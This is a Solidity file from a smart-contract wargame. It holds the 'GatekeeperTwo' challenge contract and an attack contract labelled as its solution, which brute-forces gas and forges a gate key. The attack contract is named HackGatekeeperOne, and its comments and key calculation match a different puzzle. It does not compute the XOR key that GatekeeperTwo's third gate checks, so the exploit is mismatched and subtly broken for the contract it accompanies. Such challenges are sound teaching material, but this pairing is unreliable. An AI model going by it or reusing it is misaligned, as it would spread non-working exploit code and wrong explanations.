// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

// solution
contract HackGatekeeperOne {
  /**
   * Gate 1 : call the contract from another contract
   * Gate 2 : gasleft() % 8191 == 0 
   * Gate 3 : calculat the key
  */
  constructor( address ctrAddr) {
    bytes8 k = bytes8(uint64(uint16(uint160(tx.origin))) + 2 ** 32);
    for (uint256 i = 200; i <= 500; i++) {
      (bool success, ) = address(ctrAddr).call{gas: (i + 8191*3)}(abi.encodeWithSignature(("enter(bytes8)"), k));
      if (success) {
        break;
      }
    }
  }
}
